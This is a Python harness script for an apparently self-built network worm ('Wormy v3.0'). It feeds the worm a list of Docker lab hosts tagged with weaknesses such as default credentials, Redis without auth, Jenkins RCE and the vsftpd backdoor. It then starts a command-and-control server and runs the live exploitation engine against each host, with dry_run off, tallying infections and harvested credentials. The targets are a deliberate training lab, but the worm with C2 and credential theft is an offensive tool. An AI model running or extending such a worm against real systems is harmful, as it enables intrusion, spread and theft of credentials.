"""
Wormy Docker Lab - Live Worm Execution
Bypasses the network scan phase e inyecta directamente los hosts del lab Docker
para que el motor de explotación real actue contra ellos.

USO: python tests/run_worm_vs_lab.py
"""

import os
import sys
import time

if sys.stdout.encoding and sys.stdout.encoding.lower() != "utf-8":
    sys.stdout.reconfigure(encoding="utf-8")

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# ── Inicializar el WormCore ───────────────────────────────────────────────────
from configs.config import Config
from worm_core import WormCore

print("=" * 70)
print("  WORMY v3.0 — LIVE ATTACK vs DOCKER LAB")
print("  Target: Docker Desktop localhost (10 services)")
print("=" * 70)
time.sleep(1)

# Cargar config del lab
config = Config(config_file="configs/config.yaml", profile="lab_docker")

# Crear instancia del worm (con monitor CLI enriquecido)
worm = WormCore(
    config_file="configs/lab_docker.yaml",
    use_cli_monitor=True,
    dry_run=False,
)

# ── Inyectar hosts conocidos del lab Docker ───────────────────────────────────
# (Simulamos el resultado que daría el scanner en un entorno Linux)
LAB_HOSTS = [
    # ── Database Services ──────────────────────────────────────────────────
    {
        "ip": "192.168.100.10",  # lab_redis (password: redis123)
        "open_ports": [6379],
        "os_guess": "Linux (Redis 7)",
        "services": {"6379": "redis"},
        "hostname": "lab_redis",
        "vulnerabilities": ["redis_weak_auth"],
    },
    {
        "ip": "192.168.100.11",  # lab_redis_noauth (no password!)
        "open_ports": [6379],
        "os_guess": "Linux (Redis 7 noauth)",
        "services": {"6379": "redis"},
        "hostname": "lab_redis_noauth",
        "vulnerabilities": ["redis_noauth"],
    },
    {
        "ip": "192.168.100.12",  # lab_mysql
        "open_ports": [3306],
        "os_guess": "Linux (MySQL 5.7)",
        "services": {"3306": "mysql"},
        "hostname": "lab_mysql",
        "vulnerabilities": ["mysql_default_creds"],
    },
    {
        "ip": "192.168.100.13",  # lab_postgres
        "open_ports": [5432],
        "os_guess": "Linux (PostgreSQL 14)",
        "services": {"5432": "postgresql"},
        "hostname": "lab_postgres",
        "vulnerabilities": ["postgres_default_creds"],
    },
    {
        "ip": "192.168.100.14",  # lab_mongodb
        "open_ports": [27017],
        "os_guess": "Linux (MongoDB 6)",
        "services": {"27017": "mongodb"},
        "hostname": "lab_mongodb",
        "vulnerabilities": ["mongodb_default_creds"],
    },
    {
        "ip": "192.168.100.15",  # lab_mssql
        "open_ports": [1433],
        "os_guess": "Windows Server 2019 (MSSQL)",
        "services": {"1433": "mssql"},
        "hostname": "lab_mssql",
        "vulnerabilities": ["mssql_default_sa"],
    },
    # ── Messaging ──────────────────────────────────────────────────────────
    {
        "ip": "192.168.100.20",  # lab_rabbitmq
        "open_ports": [5672, 15672],
        "os_guess": "Linux (RabbitMQ 3)",
        "services": {"5672": "amqp", "15672": "http"},
        "hostname": "lab_rabbitmq",
        "vulnerabilities": ["rabbitmq_default_creds"],
    },
    # ── HTTP / CI / Web Apps ───────────────────────────────────────────────
    {
        "ip": "192.168.100.31",  # lab_tomcat
        "open_ports": [8080],
        "os_guess": "Linux (Tomcat 9)",
        "services": {"8080": "http"},
        "hostname": "lab_tomcat",
        "vulnerabilities": ["tomcat_default_creds"],
    },
    {
        "ip": "192.168.100.32",  # lab_jenkins
        "open_ports": [8080],
        "os_guess": "Linux (Jenkins LTS)",
        "services": {"8080": "http"},
        "hostname": "lab_jenkins",
        "vulnerabilities": ["jenkins_unauth_rce"],
    },
    {
        "ip": "192.168.100.40",  # lab_dvwa
        "open_ports": [80],
        "os_guess": "Linux (DVWA - PHP)",
        "services": {"80": "http"},
        "hostname": "lab_dvwa",
        "vulnerabilities": ["dvwa_sqli", "dvwa_login_bypass"],
    },
    {
        "ip": "192.168.100.50",  # lab_juice
        "open_ports": [3000],
        "os_guess": "Linux (Node.js/Juice Shop)",
        "services": {"3000": "http"},
        "hostname": "lab_juice",
        "vulnerabilities": ["juice_shop_sqli", "juice_shop_xss"],
    },
    {
        "ip": "192.168.100.60",  # lab_elasticsearch
        "open_ports": [9200],
        "os_guess": "Linux (Elasticsearch 7)",
        "services": {"9200": "http"},
        "hostname": "lab_elasticsearch",
        "vulnerabilities": ["elasticsearch_noauth"],
    },
    # ── Network Services (FTP, SSH, Telnet, SNMP) ──────────────────────────
    {
        "ip": "192.168.100.70",  # lab_ftp
        "open_ports": [21],
        "os_guess": "Linux (Pure-FTPd)",
        "services": {"21": "ftp"},
        "hostname": "lab_ftp",
        "vulnerabilities": ["ftp_default_creds"],
    },
    {
        "ip": "192.168.100.71",  # lab_ssh
        "open_ports": [2222],
        "os_guess": "Linux (OpenSSH)",
        "services": {"2222": "ssh"},
        "hostname": "lab_ssh",
        "vulnerabilities": ["ssh_weak_creds"],
    },
    {
        "ip": "192.168.100.72",  # lab_telnet
        "open_ports": [23],
        "os_guess": "Linux (BusyBox telnetd)",
        "services": {"23": "telnet"},
        "hostname": "lab_telnet",
        "vulnerabilities": ["telnet_default_creds"],
    },
    {
        "ip": "192.168.100.73",  # lab_snmp
        "open_ports": [161],
        "os_guess": "Linux (Net-SNMP)",
        "services": {"161": "snmp"},
        "hostname": "lab_snmp",
        "vulnerabilities": ["snmp_public_community"],
    },
    # ── Metasploitable2 (multi-service legacy) ──────────────────────────────
    {
        "ip": "192.168.100.100",  # lab_metasploitable
        "open_ports": [21, 22, 23, 25, 80, 111, 139, 445, 3306, 5432, 5900, 6667, 8180],
        "os_guess": "Linux (Metasploitable2 - Ubuntu 8.04)",
        "services": {"21": "ftp", "22": "ssh", "23": "telnet", "80": "http", "445": "smb"},
        "hostname": "lab_metasploitable",
        "vulnerabilities": [
            "vsftpd_backdoor",
            "ssh_weak_creds",
            "telnet_default_creds",
            "samba_usermap_script",
            "distcc_exec",
            "unreal_ircd_backdoor",
        ],
    },
]

# Inyectar en el estado interno del worm
print(f"\n[*] Seeding worm with {len(LAB_HOSTS)} known Docker lab hosts...")
worm.scan_results = LAB_HOSTS

# Registrar en knowledge graph si está disponible
if worm.knowledge_graph:
    for host in LAB_HOSTS:
        try:
            worm.knowledge_graph.add_host(host["ip"])
        except Exception:
            pass

# Registrar en CLI monitor
if worm.cli_monitor:
    for host in LAB_HOSTS:
        worm.cli_monitor.log_event(
            "scan",
            f'Host discovered: {host["hostname"]} ({host["os_guess"]})',
            host["ip"],
            {"ports": host["open_ports"], "os": host["os_guess"]},
        )

print(f"[*] Lab hosts injected. Starting worm exploitation engine...\n")
time.sleep(2)

# ── EJECUTAR: exploit each target through the real engine ─────────────────────
from datetime import datetime

worm.running = True
worm.start_time = datetime.now()
worm.stats["start_time"] = worm.start_time

# Marcar host local como infectado (origen)
worm.infected_hosts.add("192.168.1.1")

# Arrancar C2 en background si está disponible
if worm.c2_server:
    try:
        worm.c2_server.run_background()
    except Exception:
        pass

# Arrancar monitor CLI
if worm.cli_monitor:
    monitor_thread = worm.cli_monitor.start_background(refresh_interval=1.5)

time.sleep(1)

# ── Loop de explotación real ──────────────────────────────────────────────────
for i, target in enumerate(LAB_HOSTS):
    if not worm.running:
        break

    print(
        f"\n[ITERATION {i+1}] Attacking {target['hostname']} ({target['ip']}:{target['open_ports']})..."
    )

    if worm.cli_monitor:
        worm.cli_monitor.log_event(
            "ml_decision",
            f'Target selected: {target["hostname"]}',
            target["ip"],
            {"confidence": 0.85 - i * 0.05},
        )

    # Llamar al motor real de explotación
    worm.exploit_target(target)

    # Mostrar estado tras cada intento
    infected = len(worm.infected_hosts) - 1  # excluir origen
    print(f"  → Infected so far: {infected} | Failed: {len(worm.failed_targets)}")

    time.sleep(1.5)

# ── Reporte final ─────────────────────────────────────────────────────────────
worm.stats["end_time"] = datetime.now()
worm.running = False

print("\n" + "=" * 70)
print("  FINAL REPORT")
print("=" * 70)
print(f"  Hosts Targeted  : {len(LAB_HOSTS)}")
print(f"  Hosts Infected  : {len(worm.infected_hosts) - 1}")
print(f"  Hosts Failed    : {len(worm.failed_targets)}")
print(f"  Exploits Tried  : {worm.stats.get('exploit_attempts', 0)}")
print(f"  ML Decisions    : {worm.stats.get('ml_decisions', 0)}")
print(f"  C2 Beacons      : {worm.stats.get('c2_beacons', 0)}")
print(f"  Creds Found     : {worm.stats.get('credentials_discovered', 0)}")
print("=" * 70)

if worm.cli_monitor:
    worm.cli_monitor.stop()
